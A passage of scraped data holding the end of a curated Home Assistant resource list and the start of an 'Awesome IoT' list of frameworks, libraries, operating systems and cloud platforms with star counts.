themes.\nmidnight - a dark theme by marcel hoffs.\ndark cyan - a dark theme with cyan accents by ryoen deprouw.\ngrey night - a dark theme with grey accents by ksya.\ndark red - a dark theme with red accents by ryoen deprouw.\nhalloween - pumpkins colored by mahasri kalavala.\nblack and green - a dark theme with pale green accents by greenturtwig.\nvintage - give your frontend a vintage look with this theme by anup surendran.\ncarbon green - light carbon theme with green accents by reua.\n20 great themes - 20 great themes by juanmtech (includes a guide).\nmany themes, one repo - 13 themes in a convenient zip file.\nslate - a dark theme close to the vanila looks from seangreen2.\nsynthwave - a theme influenced by the cover artwork of modern synthwave bands.\ngoogle home theme - two themes (light and dark) matching the design of google home hub.\ncustom lovelace ui cards\nlovelace allows people to build custom cards on top of it, which you can easily add to your instance.\nauto-entities card - dynamically adds entities: \ud83d\udd2e magic.\ncanvas gauge card - use awesome gauges from canvas-gauges.com.\nbig number card - display big numbers for sensors, including severity level as background.\nanimated weather card - nice looking card showing the weather, with subtle animations.\nthermostat card - thermostat control card that looks like a nest thermostat.\nmini media player - a minimalistic media player card.\nmini graph card - a minimalistic sensor graph card.\nbutton card - button card for your entities.\nslideshow card - dynamic slideshow of images or cards.\nswiper card - flick/swipe through multiple cards.\nslider entity row - add a slider to adjust, e.g., the brightness of lights in lovelace entity cards.\npower wheel card - an intuitive way to represent the power that your home is consuming or producing.\nsimple thermostat - a simpler and more flexible thermostat card.\ncompact custom header - customize and compact the frontend header bar.\ncard modder - style your lovelace cards.\nbar card - customizable animated bar card.\nforked-daapd card - control a forked daapd instance.\ndual gauge card - shows two gauges in one.\natomic calendar card - calendar card with advanced settings.\nxiaomi vacuum card - detailed card for xiaomi vacuum cleaners (and others).\nsimple weather card - a minimalistic weather card, inspired by google material design.\nlovelace floorplan - interaction with your entities from a floorplan.\nhome card - a quick glance of the state of your home.\nbanner card - a fluffy linkable banner with interactive glances to spice up your home dashboards.\nupcoming media card - display upcoming episodes and movies from services like: plex, kodi, radarr, sonarr, and trakt.\nspotify card - list and select from current available devices and users top playlists on spotify.\nbattery entity - displaying battery levels for battery entities.\nmultiple entity row - show multiple entity states or attributes on entity rows.\nxiaomi vacuum map card - interactive xiaomi vacuum map, just like in mi home app.\nhome feed card - display a combination of persistent notifications, calendar events, and entities in the style of a feed.\nconfig template card - allow using templates in lovelace.\nrgb light card - colorful buttons to control your rgb lights.\nlg webos remote control - remote control for lg tv webos.\nrestriction card - a card to provide restrictions on lovelace cards defined within.\nvacuum card \u2014 a card to card for controlling a vacuum cleaner robot.\npurifier card \u2014 a card for controlling air purifiers.\nalternative dashboards\ntileboard - a simple yet highly configurable dashboard.\ncustom components\nadditional components for home assistant, that were created by the community.\nhue sensors - enables the use of philips hue sensors.\ngoogle geocode - converts a device tracker location into a human-readable address.\nlutron caseta pro - integrates lutron caseta smart bridge pro / ra2 select.\nsmartir - integrates devices using broadlink ir.\nxiaomi hygrothermo - sensor platform for xiaomi mijia bt hygrothermo temperature and humidity sensor.\nvolkswagen carnet - integrates volkswagen carnet (requires valid carnet subscription).\nuntappd - connects with your untappd account.\nelasticsearch - publishes events to elasticsearch.\nsonoff/ewelink - control sonoff/ewelink smart devices using the stock firmware.\nalexa media player - allow control of amazon alexa devices.\nicloud3 - improved version of the icloud device tracker component with a lot of capabilities.\nhacs - this is a manager for your custom integration (components) and plugin (lovelace elements) needs.\nbreaking_changes - component to show potential breaking_changes in the current published version based on your loaded components.\ncircadian lighting - circadian lighting slowly synchronizes your color changing lights with the regular naturally occuring color temperature of the sky throughout the day.\nhass aarlo - asynchronous arlo integration. similar to the arlo web site; monitors events and states for all base stations, cameras and doorbells.\nxiaomi cloud map extractor - this custom integration provides a way to present a live view of a map for a xiaomi (and roborock) vacuums without a need for rooting.\ndiy\ndo it yourself; rather than buying home automation hardware or solutions, you could also build them yourself!\nesphome - program esp8266 boards and esp32 boards using yaml.\nmagic cards - rfid scannable cards that you can program to do anything.\nsonoff tasmota - firmware for esp8266 boards and devices.\ndiy gateways\nopenmqttgateway - a flexible mqtt gateway for ir, rf, ble, miflora, sms, and many sensors.\nesp8266 milight hub - alternative hub for milight/limitlessled devices that uses mqtt.\nzigbee2mqtt - zigbee to mqtt bridge, get rid of your proprietary zigbee bridges.\ndiy projects\nha switchplate - lcd touchscreen wall switch replacement.\n\ud83d\udcfa diy multisensor - $15, temperature, humidity, light, motion, and rgb led, without soldering.\n$10 wifi rgb bulb - in inexpensive rgb bulb that works on wifi.\n433mhz/ir bidirectional gateway - bidirectional with ir and 433mhz using esp8266 and mqtt.\nesp8266mqttblinds - automate your window blinds using an esp8266, a servo and mqtt.\nhome assistant's hackster.io - a hackster channel with multiple diy projects.\nesp mqtt digital leds - ws2811 led stripe for the json light component from bruh.\nbed presence detection - esp8266 based bed presence detection.\nnfc scanner - build an nfc tag/card scanner with an esp8266, pn532 and mqtt.\nesp32-cam facebox - tie a esp32-cam, ha, and facebox together for a cheap facial recog / home monitoring solution.\nraspipool - a cost-effective, easy-to-build, easy-to-use \"swimming-pool automation system\".\nquinled - diy wi-fi led dimmers and controllers using esp32 boards.\nonline resources\nlinks to various users of home assistant that regularly publish home assistant focussed content.\nblogs\ndiy futurism - brad posts articles with great instructions for new users.\nphil hawthorne - co-host of the home assistant podcast.\nsmart home hobby - features budget friendly guides and information.\nself hosted home - articles on diy home automation projects and self hosted services.\ntinkering with home automation - tinkerer's blog and guides.\nhometechhacker - diy smarthome guides, reviews, and advice.\nintermittent technology - quindor's personal blog for pasting random (mostly technology related) things.\nyoutube channels\nsit back, relax, watch, and learn.\nbruh - ben has great tutorials for getting started, unfortunately, inactive lately.\nburnsha - great informational and tutorial videos.\ndrzzs - great how-to videos and also streams live.\nthe hook up - tutorials and more, also has videos on home automation in general.\nhasscasts - tips, tricks & tutorials, moving to mainly live streams.\njuanmtech - easy to follow how-to videos, product reviews and more.\nvcloudinfo - publishes videos based on his home and github repository.\ndigiblurdiy - tutorials on hardware projects and tasmota automations.\nintermit.tech - tutorials & reviews: camera's, home networking, esp8266 boards, node-red.\nbeardedtinker - tutorials & 3d printing.\nsmart home junkie - how-to videos and tutorials for starters and advanced users.\npodcasts\nget inspired, while commuting, doing your morning routine, or at the gym!\nhome assistant podcast - biweekly podcast with the latest news and interesting guests.\ntwitter\nkeep up with the latest news and updates, 280 characters at a time!\n@home_assistant - open source home automation that puts local control and privacy first.\n@hass_devs - latest news on the development of home assistant for contributors.\n@balloob - founder of the home assistant project.\n@pvizeli - core developer and creator of the hass.io project.\n@frenck - creator of this awesome list and maintainer of the community hass.io add-ons project.\n@ccostan - blogger of all things tech. smart home, #iot & other geeky subjects.\n@hometechhacker - guy friends call when #tech happens. tweet 25-50x/week about #smarthome, #homenetwork, #cybersecurity, #linux, #gadgets, and #life.\n@hassioaddons - for all commmunity add-on news and updates.\n@dr_zzs - great how-to videos and also streams live.\nuncategorized\nvaluable links, that don't fit in any of the above categories (yet!).\nroom assistant - a companion client to handle sensors in multiple rooms.\nhome assistant companion - iphone/ipad/ios app to control and monitor your home remotely.\nmi flora via mqtt daemon - collect and transfer xiaomi mi flora plant sensor data via mqtt.\nhassctl - simple command line utility to help debug your configuration.\nrhasspy - toolkit for developing custom voice assistants.\nfully kiosk browser - highly configurable android kiosk browser and app launcher.\nhassio vagrant - vagrant box original created for developing add-ons.\nappdaemon - appdaemon is a loosely coupled, multi-threaded, sandboxed python execution environment for writing automation apps.\ndeveloper documentation - the official developer documentation.\nhass configurator - browser-based configuration file editor.\nha-dockermon - a node.js service for restful switches to control docker containers.\npython amazon dash - hack your amazon dash to run what you want. without welders.\nhomekit2mqtt - homekit to mqtt bridge.\nhome assistant device database - database of supported/confirmed working devices.\njinja scripts for curious minds - bunch of jinja2 scripts helping you to understand it better.\nwallpanel - android application for web-based dashboards and home automation platforms.\nariela - freemium android client application with widget support.\ngitlab ci/cd - how to simplify your smart home configuration with gitlab ci/cd.\nmonitor - distributed advertisement-based btle presence detection reported via mqtt.\nhass-data-detective - explore and analyse your database data.\nadb intents - list of adb intents to control android devices.\nhome assistant config helper for vscode - visual studio code extension that provides auto-completion, config validation and snippets when editting your configuration.\nhome assistant taskbar menu - a client for windows that can display lovelace views, control entities and show persistent notifications.\nalternative home automation software\nhome assistant isn't the only home automation framework out there, here are some alternatives.\nopenhab - java-based and aims at being a universal integration platform.\ndomoticz - a lightweight home automation system.\ngladys - open source program which runs on your raspberry pi.\nsmartthings - commercial home automation hub by samsung.\nother awesome lists\nother amazingly awesome lists that can be found on the great and dangerous interwebs.\nawesome-smarthome - curated list of awesome smarthome/home automation things.\nawesome-iot - curated list of awesome internet of things projects and resources.\nawesome-open-iot - curated list of open source iot frameworks, libraries and software.\nawesome-amazon-alexa - curated list of awesome resources for the amazon alexa platform.\nawesome-mqtt - curated list of mqtt related stuff.\nawesome-sefhosted - curated list of awesome self hosted software.\ncontributing\nthis awesome list is an active open-source project and is always open to people who want to contribute to it. we have set up a separate document containing our contribution guidelines.\nthe original setup of this awesome list is by franck nijhof.\nfor a full list of all authors and contributors, check the contributor's page.\nthank you for being involved! \ud83d\ude0d\ntrademark legal notice\nthis awesome list is not created, developed, affiliated, supported, maintained or endorsed by home assistant.\nall product names, logos, brands, trademarks and registered trademarks are property of their respective owners. all company, product, and service names used in this list are for identification purposes only.\nuse of these names, logos, trademarks, and brands does not imply endorsement.\nlicense\ndistributed under the creative commons attribution 4.0 license. see license for the complete license.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000038, "year": null}, {"Unnamed: 0": 39, "autor": 39, "date": null, "content": "Awesome IoT\nA curated list of IoT. Everyone can contribute here!\nSimliar Projects\nAwesome Azure IoT - A curated list of awesome Azure Internet of Things projects and resources.\nAwesome Android Things - A curated list of awesome Android Things tutorials, libraries and much more at one place\nAwesome OpenIoT - A curated list of awesome open source IoT frameworks, libraries and software.\nAwesome IoT - A curated list of awesome Internet of Things projects and resources.\nToC\nFramework\nLibrary\nSDK\nArduino\nLow Level\nApp\nStorage\nSecurity\nOS\nAndroid Things\nVoice Controller\nPlatform\nIoT Clouds\nIIoT Clouds\nAPIs\nMiddleware\nToolkits Include Non-OS\nData Visualization\nHardware\nHome Automation\nIDE\nRobotics\nOthers\nLanguage\nOthers\nProtocol Library\nMQTT\nCoAP\nSpark\nWeMo\nSMCP\nLora\nOpenThread\nOthers\nFork\nHardware Com\nNFC\nSerial\nOthers\nSoftware\nTools\nVoice\nAI\nResources-Websites-Projects\nCourse\nWebSite\nBlog\nGroup\nGitHub Org.\nFree Book\nRelated Resources Projects\nTutorial\nEdge\nAnalytics\nOthers\nFramework\n.NET Core IoT \u2605 1193 \u29d7 292 - A set of libraries to interact with sensors, displays and input devices from .NET Core framework. This libraries allows to work with the GPIO port for various boards like Raspberry Pi and Hummingboard and contains a growing set of community-maintained device bindings for IoT components.\nAREG SDK \u2605 15 \u29d7 0 - AREG SDK is a developer-friendly, an interface-centric real-time asynchronous communication engine to enable distributed- and mist-computing, where connected Things interact and provide services, as if they act like thin distributed servers.\nCylon \u2605 2339 \u29d7 0 - JavaScript framework for robotics, physical computing, and the Internet of Things.\ndevify-server \u2605 53 \u29d7 1 - s extremely light weight, and is very easy to use. It aims to help developers to create IoT application servers, faster.\nEpoc.js \u2605 27 \u29d7 0 - This framework provides an interface to access data from the Emotiv EPOC brain sensor using Node.js.\nESP-IDF \u2605 2542 \u29d7 0 - The official framework from Espressif to build Wi-Fi, BLE, and BT apps with ESP32.\nFogLight \u2605 10 \u29d7 100 - is a lightweight runtime that enables makers of all ages and skill levels to create highly performant apps for embedded devices like Raspberry Pis.\nframboos \u2605 75 \u29d7 3 - is a small Java wrapper around the default GPIO driver on Linux boards like Raspberry Pi and BeagleBoard.\nFreedomotic \u2605 208 \u29d7 4 - is an open source, flexible, secure Internet of Things (IoT) application framework, useful to build and manage modern smart spaces.\nGoBot \u2605 2062 \u29d7 1 - Golang framework for robotics, physical computing, and the Internet of Things.\nGrow IoT \u2605 7 \u29d7 7 - is a full javascript based IoT stack with a simple API and basic user interface.\nguh \u2605 50 \u29d7 29 - is an open source IoT (Internet of Things) server, which allows to control a lot of different devices from many different manufacturers.\nheimcontrol.js \u2605 1306 \u29d7 4 - Home-Automation with node.js and Raspberry PI.\nIoT 433 MHz \u2605 121 \u29d7 11 - IoT System to control 433 MHz RC power sockets, PIR, Door Sensors and much more.\nIoT Edge \u2605 264 \u29d7 0 - The Azure IoT Gateway SDK was our first step to enabling edge analytics in IoT solutions.\nIoT SOL \u2605 38 \u29d7 0 - The total solution that provides visual graphical programming for developing IoT applications.\nIoTCloud 2 \u2605 14 \u29d7 50 - An open source framework for IoT and Sensor Centric Applications.\njohnny-five \u2605 6024 \u29d7 0 - JavaScript Robotics and IoT programming framework, developed at Bocoup, Firmata Protocol.\nKura \u2605 85 \u29d7 1 - an open-source framework for development of IoT applications\nLelylan \u2605 647 \u29d7 1 - OpenSSL Source Lightweight Microservices Architecture for the Internet of Things. For developers.\nLightweight MQTT Machine Network \u2605 21 \u29d7 1 - LWMQN is a machine network framework with MQTT. See also: IPSO Alliance Technical Archive.\nLiota \u2605 162 \u29d7 2 - is an open source offering for IoT solution developers and resides primarily on IoT gateways.\nOpenDevice \u2605 23 \u29d7 8 - Open IoT (Internet Of Things) Platform and Framework.\nPando Cloud \u2605 75 \u29d7 2 - is the cloud part of Pando IoT solution. It's made of a bunch of tools, protocols and frameworks below: Pando Cloud, Pando Embedded Framework, Pando Protocol as so on.\nPingo \u2605 211 \u29d7 0 - Generic API for controlling boards with programmable IO pins.\nPolyMCU \u2605 84 \u29d7 2 - has been designed from the beginning to be as flexible as possible: host OS independent, support any toolchain, any RTOS, any micro-controller vendor SDK.\nrpi-gpio.js \u2605 221 \u29d7 5 - Control Raspberry Pi GPIO pins with node.js.\nSensorBee \u2605 54 \u29d7 33 - Lightweight stream processing engine for IoT\nServerless \u2605 7951 \u29d7 0 - Serverless is the application framework for building web, mobile and IoT applications exclusively on Amazon Web Services' Lambda and API Gateway.\nSimgrid \u2605 46 \u29d7 53 - is a scientific instrument to study the behavior of large-scale distributed systems such as Grids, Clouds, HPC or P2P systems.\nSming \u2605 1800 \u29d7 0 - Sming is an asynchronous C/C++ framework with superb performance and multiple network features. Sming is open source and is tailored towards embedded devices.\nThingsboard IoT Gateway \u2605 463 \u29d7 246 - open-source IoT Gateway - integrates devices connected to legacy and third-party systems with Thingsboard IoT Platform using OPC-UA and MQTT protocols.\nLibrary\nSDK\nArmbian build SDK \u2605 630 - for creating customized kernel and Debian based userspace for popular development boards.\nAWS IoT Arduino Y\u00fan SDK \u2605 63 \u29d7 4 - SDK for connecting to AWS IoT from an Arduino Y\u00fan.\nAzure IoT Gateway SDK \u2605 26 \u29d7 2 - contains the infrastructure and modules to create IoT gateway solutions.\nCylon.js For Intel IoT \u2605 29 \u29d7 40 - is a JavaScript framework for robotics, physical computing, and the Internet of Things (IoT).\nElectron \u2605 41 \u29d7 16 - The Electron is a tiny cellular development kit based around U-Blox's SARA U-series (3G) or G-series (2G) cellular modem module and a STM32F205 ARM Cortex M3 microcontroller.\nESP8266 Arduino Core \u2605 2588 \u29d7 0 - Arduino core for ESP8266 WiFi chip.\nEZ-Connect Lite SDK \u2605 67 \u29d7 16 - Marvell's Starter SDK for AWS IoT Service.\nMicrosoft Azure IoT SDK \u2605 203 \u29d7 1 - SDKs for a variety of languages and platforms that help connect devices to Microsoft Azure IoT services.\nArduino\nArduinoJson \u2605 873 \u29d7 0 - An elegant and efficient JSON library for embedded systems.\nIno \u2605 874 \u29d7 1 - Ino is a command line toolkit for working with Arduino hardware.\nPJON \u2605 427 \u29d7 4 - Digital communication framework for Arduino and IOT.\nWindows Remote Arduino \u2605 98 \u29d7 13 - Remote \"Arduino Wiring\" interface for Windows 8.1, Windows Phone 8.1 and Windows 10. Used to control an Arduino from a Universal Windows Platform application.\nWiringPi \u2605 455 \u29d7 11 - Gordon's Arduino wiring-like WiringPi Library for the Raspberry Pi.\nLow Level\nAmazon Echo Bridge \u2605 452 \u29d7 1 - Amazon Echo Bridge allows you to quickly emulate a Phillips Hue bridge, bringing the ability to seamlessly integrate an Amazon Echo into various home automation systems.\naWOT \u2605 69 \u29d7 8 - Web server library for Arduino, Teensy, ESP8266 and ESP32\nbtstack \u2605 151 \u29d7 1 - Dual-mode Bluetooth stack, with small memory footprint.\nCocoaMQTT \u2605 210 \u29d7 0 - MQTT for iOS and OS X written with Swift.\nDevices \u2605 134 \u29d7 0 - Suite of libraries for IoT devices (written in Go).\nfauxmoESP - Belkin WeMo emulator library for ESP8266.\ninih \u2605 312 \u29d7 3 - is a simple .INI file parser written in C.\nIoT Helpers \u2605 37 \u29d7 8 - A library that allows to easily interact with Windows 10 IoT Core features like GPIO, I2C and SPI devices.\nIoTit Flashing tool \u2605 18 \u29d7 2 - is an open source command-line utility for flashing (initializing) IoT devices.\nkrypton \u2605 7 \u29d7 35 - Embedded TLS/DTLS library, source and binary compatible OpenSSL subset\nLadon \u2605 114 \u29d7 2 - is a library written in Go for access control policies, similar to Role Based Access Control or Access Control Lists.\nlibtuv \u2605 19 \u29d7 17 - Asynchronous I/O for IoT.js and embedded system.\nlibui \u2605 8021 \u29d7 1 - Simple and portable (but not inflexible) GUI library in C that uses the native GUI technologies of each platform it supports.\nLK \u2605 312 \u29d7 0 - The LK embedded kernel. An SMP-aware kernel designed for small systems.\nMagenta \u2605 286 \u29d7 0 - Magenta is a new kernel that powers the Fuchsia OS.\nMATRIX OS \u2605 29 \u29d7 12 - is a platform for running applications on the MATRIX Creator.\nmatrixssl \u2605 36 \u29d7 0 - is an embedded SSL and TLS implementation designed for small footprint IoT devices requiring low overhead per connection.\nMCUBoot \u2605 43 \u29d7 3 - is a secure bootloader for 32-bit MCUs.\nnexmon \u2605 885 \u29d7 2 - is our C-based firmware patching framework for Broadcom/Cypress WiFi chips.\nPelion Device Management Client \u2605 19 \u29d7 41 - a library that connects devices to Pelion Device Management service and to Mbed-enabled cloud services from our partners.\npingo-py \u2605 223 \u29d7 15 - provides a uniform API to program devices like the Raspberry Pi, BeagleBone Black, pcDuino etc. just like the Python DBAPI provides an uniform API for database programming in Python.\npolymcu \u2605 57 \u29d7 3 - an open framework for micro-controller software.\nSecure Device Grid \u2605 4 \u29d7 20 - Secure device-to-device communication solution for IOT.\nsimbody \u2605 540 \u29d7 0 - High-performance C++ multibody dynamics/physics library for simulating articulated biomechanical and mechanical systems like vehicles, robots, and the human skeleton.\nSmartObject \u2605 8 \u29d7 2 - A Smart Object Class that helps you with creating IPSO Smart Objects in your JS apps. See also: IPSO Alliance Technical Archive.\nSoletta \u2605 96 \u29d7 2 - Soletta Project is a framework for making IoT devices. With Soletta Project's libraries developers can easily write software for devices that control actuators/sensors and communicate using standard technologies.\nSPIFFS \u2605 174 \u29d7 0 - Wear-leveled SPI flash file system for embedded devices.\nSUSI \u2605 13 \u29d7 150 - is an application framework to build interfaces for arbitrary systems.\nSwiftyGPIO \u2605 407 \u29d7 1 - a Swift library to interact with Linux GPIO/SPI on ARM.\nuIP \u2605 246 \u29d7 3 - uIP is a very small implementation of the TCP/IP stack.\nWifiDog \u2605 291 \u29d7 1 - a complete and embeddable captive portal solution for wireless community groups or individuals.\nWindows 10 IoT Core IoT Helpers \u2605 25 \u29d7 0 - his library allows to easily interact with GPIO, I2C and SPI devices in Windows 10 IoT Core.\nxfrp \u2605 14 \u29d7 2 - frp client for openwrt&LEDE, frp is a fast reverse proxy to help you expose a local server behind a NAT or firewall to the internet.\nXiPKI \u2605 34 \u29d7 10 - eXtensible sImple Public Key Infrastructure consists of CA and OCSP responder.\nxkcptun \u2605 104 \u29d7 25 - xkcptun is kcp tunnel for OpenWRT&LEDE, implemented in c language\nApp\nCordova BLE \u2605 149 \u29d7 3 - Bluetooth Low Energy plugin for Cordova\nCordova MQTT Plugin \u2605 24 \u29d7 11 - MQTT Cordova Plugin for Apache Cordova\nIOT Espressif Android \u2605 46 \u29d7 1 - is used to control ESP8266 device by Android pad or phone.\nMQTTX \u2605 12 \u29d7 0 - MQTTX is a cross-platform MQTT desktop client open sourced by EMQ, which supports macOS, Linux, and Windows. It allows users to quickly and easily test MQTT / MQTTS connections, publish and subscribe to MQTT messages.\nPhoneGap NFC \u2605 312 \u29d7 2 - PhoneGap NFC Plugin\nPWAify \u2605 269 \u29d7 8 - Experimental project to convert your PWA (Progressive Web App) into a cross-platform Electron app. Brings PWAs to your desktop.\nSummon \u2605 7 \u29d7 52 - A platform for mobile devices that provides a convenient and scalable mechanism for IoT device interactivity, enabled by web-based interfaces and driven by the devices themselves.\nStorage\nhypergolix \u2605 72 \u29d7 11 - is programmable cloud sync -- like Dropbox, but you integrate it into your applications instead of using it from the filesystem.\nIoTDL \u2605 9 \u29d7 8 - an SQL-like language for the IoT.\nnode-iotdb \u2605 19 \u29d7 61 - Easily control the Internet of Things using Semantics.\nHStreamDB \u2605 172 - The streaming database built for IoT data storage and real-time processing.\nSecurity\nIoTSeeker This scanner will scan a network for specific types of IoT devices to detect if they are using the default, factory set credentials.\nnShield \u2605 66 \u29d7 35 - An Easy and Simple Anti-DDoS solution for VPS,Dedicated Servers and IoT devices based on iptables.\nScanners-Box \u2605 424 \u29d7 0 - the toolbox of open source scanners.\ntrezor-crypto \u2605 94 \u29d7 1 - \ud83d\udcd9 Heavily optimized cryptography algorithms for embedded devices.\nOS\nMynewt is an open-source operating system for tiny embedded devices. Its goal is to make it easy to develop applications for microcontroller environments where power and cost are driving factors.\nAmazon FreeRTOS \u2605 842 \u29d7 0 - is an operating system for microcontrollers that makes small, low-power edge devices easy to program, deploy, secure, connect, and manage.\nARM mbed \u2605 629 \u29d7 0 - The ARM\u00ae mbed\u2122 IoT Device Platform provides the operating system, cloud services, tools and developer ecosystem to make the creation and deployment of commercial, standards-based IoT solutions possible at scale.\nArmbian - Debian based Docker enabled lightweight Linux for popular development boards. Optimised for embedded usage.\nBrillo - Brillo extends the Android platform to all your connected devices.\nContiki \u2605 1813 \u29d7 0 - The Open Source OS for the Internet of Things\nf9-kernel \u2605 316 \u29d7 4 - An efficient and secure microkernel built for ARM Cortex-M cores, inspired by L4\nFlingOS \u2605 176 \u29d7 0 - An educational operating system written in C#. A great stepping stone from high to low level development.\nHuawei LiteOS \u2605 341 \u29d7 3 - Huawei LiteOS Kernel.\nHypriot \u2605 253 \u29d7 62 - HypriotOS for the Raspberry Pi is a Debian-based Container OS optimized for Docker.\nJanOS \u2605 138 \u29d7 0 - JanOS is an operating system designed to run on the chipset of mobile phones.\nLinino \u2605 83 \u29d7 13 - Linino is a GNU/Linux distribution based on OpenWRT and maintained by DogHunter.\nLua-RTOS-ESP32 \u2605 131 \u29d7 2 - is a real-time operating system designed to run on embedded systems, with minimal requirements of FLASH and RAM memory.\nmacchina.io \u2605 144 \u29d7 0 - An open-source toolkit for building embedded IoT applications that connect sensors, devices and cloud services.\nNodeOS \u2605 3605 \u29d7 0 - Lightweight operating system using Node.js as userspace.\nNuttX - is a real-time operating system (RTOS) with an emphasis on standards compliance and small footprint. Scalable from 8-bit to 32-bit microcontroller environments, the primary governing standards in NuttX are Posix and ANSI standards.\nOpenWrt \u2605 230 \u29d7 173 - OpenWrt is described as a Linux distribution for embedded devices.\npikoRT \u2605 164 \u29d7 5 - A tiny Linux-like real-time kernel optimized for ARM Cortex-M chips.\nRaspbian - Raspbian is a free operating system based on Debian optimized for the Raspberry Pi hardware.\nRIOT \u2605 748 \u29d7 1 - The friendly Operating System for the Internet of Things\nRMP \u2605 19 \u29d7 8 - A single-file rapid development RTOS for IoT with integrated graphics.\nRT-Thread \u2605 493 \u29d7 0 - RT-Thread is an open source real-time operating system for embedded devices from China.\nseL4 Microkernel \u2605 1344 \u29d7 1 - The world's first operating-system kernel with an end-to-end proof of implementation correctness and security enforcement is available as open source.\nSilk \u2605 74 \u29d7 2 - is a free (as in free beer) firmware for a number of smartphones based on the open-source Android operating system with a nodejs layer on top of it that makes it possible to write programs and get access to hardware aspects using only simple JavaScript.\nSnappy Ubuntu Core - Canonical, A new, transactionally updated Ubuntu for clouds and devices.\nTachyOS \u2605 7 \u29d7 82 - is the RTOS based on microkernel architecture which includes only minimal components like thread / synchronization, memory management, inter-thread communication while supporting execution context / address space isolation(protection) and extensible modular interface.\nTinyAra \u2605 35 \u29d7 1 - is a lightweight RTOS-based platform to support low-end IoT devices.\nTinyOS \u2605 543 \u29d7 0 - designed for low-power wireless devices, such as those used in sensor networks, ubiquitous computing, personal area networks, smart buildings, and smart meters.\nTock OS \u2605 243 \u29d7 1 - is an operating system designed for running multiple concurrent, mutually distrustful applications on Cortex-M based embedded platforms.\ntrochili \u2605 75 \u29d7 6 - A small RTOS optimized for the embedded/iot devices. Support Cortex M3.\nZephyr \u2605 352 \u29d7 5 - is a small, scalable real-time operating system for use on resource-constrained systems supporting multiple architectures.\nAndroid Things\nAndroid Things user-space drivers \u2605 140 \u29d7 2 - Sample peripheral drivers for Android Things.\nVoice Controller\nalexa-rubykit \u2605 109 \u29d7 6 - implements a quick back-end service for deploying applications for Amazon's Echo (Alexa).\nAlexaPi \u2605 17 \u29d7 1 - Turn a Raspberry Pi into an Alexa Client.\nflask-ask \u2605 946 \u29d7 0 - is a Flask extension that makes building Alexa skills for the Amazon Echo easier and much more fun.\nPlatform\n[thing-it-node] \u2605 20 \u29d7 3 - A device-independent IoT platform including support of complex event processing, storyboards, and a mobile app.\nActorCloud \u2605 32 \u29d7 0 - ActorCloud is an IoT platform that provides one-stop platform services for enterprises with low-power IoT networks. It provides multiple protocol access, message flow management, data parsing and data processing capabilities for devices on a secure and reliable basis.\nAstarte \u2605 19 \u29d7 0 - Astarte is an Open Source IoT platform written in Elixir. It is a turnkey solution which packs in everything you need for connecting a device fleet to a set of remote applications. It performs data modeling, automated data reduction, real-time events, and provides you with any feature you might expect in a modern IoT platform. Right now, Linux and ESP32 devices are supported out of the box using the provided SDKs.\nBlynk \u2605 716 \u29d7 0 - is a platform with iOS and Android apps to control Arduino, ESP8266, Raspberry Pi and the likes over the Internet.\nClavin \u2605 212 \u29d7 2 - Calvin is an application environment that lets things talk to things. It comprises of both a development framework for application developers, and a runtime environment that handles the running application.\nDeviceHive - IoT Data Platform. Wide range of connectivity options, device management, security and data processing.\nembARC Open Software Platform (OSP) \u2605 23 \u29d7 9 - is a software distribution aimed at facilitating the development of embedded systems based on ARCv2 Processors.\nflowchain-app \u2605 22 \u29d7 50 - A Flowchain plugin that provides the flow-based programming (FBP) engine.\nGrovePi \u2605 330 \u29d7 0 - is an open source platform for connecting Grove Sensors to the Raspberry Pi.\nHiveMQ \u2605 329 \u29d7 0 - is an open source MQTT platform and MQTT broker.\nHologram - Open source, full stack platform with standalone devices and usb plug in. Offers a free developer tier.\nIoT.js \u2605 921 \u29d7 0 - Platform for Internet of Things with JavaScript.\nIoTgo \u2605 173 \u29d7 0 - is an open source IoT platform, like WordPress, ZenCart and all other open source software, you can deploy your own IoTgo cloud service.\nJasper - Jasper is an open source platform for developing always-on, voice-controlled applications.\nKERBEROS.IO Web \u2605 176 \u29d7 16 - a GUI to configure the machinery and to view events that were detected by the machinery.\nKitnic \u2605 124 \u29d7 0 - A registry for ready to build open hardware electronics projects.\nLan \u2605 105 \u29d7 0 - Internet of Things Server Layer with CoAP, WebSocket, MQTT, HTTP f\nMainflux \u2605 33 \u29d7 3 - Mainflux is an open source and patent-free IoT cloud platform based on microservices.\nMobius \u2605 46 \u29d7 2 - is the open source IoT server platform based on the oneM2M standard.\nMongoose IoT \u2605 487 \u29d7 0 - is a full-stack IoT platform including firmware and cloud components available for ESP8266.\nNebula - A docker orchestrator designed to manage IoT devices\nPagenodes \u2605 99 \u29d7 0 - Completely Browser Based IOT Platform, A Chrome Progressive Web App.\nParticle(Spark) - Particle (formally Spark) is a complete, open source, full-stack solution for cloud-connected devices.\nPharoThings \u2605 37 \u29d7 29 - is a Live programming platform for IoT projects based on Pharo.\nPlatformIO \u2605 980 \u29d7 0 - PlatformIO is a cross-platform code builder and the missing library manager.\nSiemens MindSphere - Open, cloud-based IoT operating system (uses OPC UA as communication standard) from Siemens which is extensible with services.\nThingEngine \u2605 3 \u29d7 0 - An open source platform for IoT rules that you can execute anywhere you want.\nThingsboard \u2605 5102 \u29d7 1700 - Open-source IoT Platform - Device management, data collection, processing and visualization.\nUnited Manufacturing Hub \u2605 9 \u29d7 0 - The Open-Source Manufacturing App Platform (combines various open source solutions and packages them in a Helm chart, for example nodered, VerneMQ and timescaleDB)\nIoT Clouds\nAgile IoT Platform - Ayla Networks IoT Platform (with cloud services).\nAlibabaCloud - \"A cloud computing solution\"\nARM Pelion - \"Arm Pelion IoT Platform including Connectivity, Device and Data management service\"\nArtik Cloud - Samsung cloud for the IoT.\nAWS IoT - Amazon cloud for the IoT.\nAzure IoT Hub - Microsoft cloud for the IoT.\nBosch IoT Cloud - Highly scalable cloud infrastructure based on Cloud Foundry.\nCloudPlugs IoT - \"An end-to-end Fog Computing Platform for IoT.\"\nExosite murano - IoT platform by Exosite.\nGoogle Cloud IoT - Google Cloud Platform IoT solutions.\nIBM Watson - IBM cloud for the IoT.\nOracle IoT Cloud - ORACLE Cloud for the Internet of Things.\nRightech IoT Cloud - IoT platform.\nSalesforce IoT Cloud - Salesforce cloud for the Internet of Things.\nSAP HANA - SAP cloud for the Internet of Things.\nSiemens MindSphere - Open IoT ecosystem as PaaS.\nXively IoT Cloud - IoT platform.\nYaler - \"Relay infrastructure for secure access to embedded systems\".\nZatar - \"Zatar is the first ARMmbed standards-based IoT cloud service\".\nEMQ X Cloud - Fully managed MQTT IoT Cloud. IoT MQTT 5.0 cloud service for rapid deployment, easy management, and on-demand 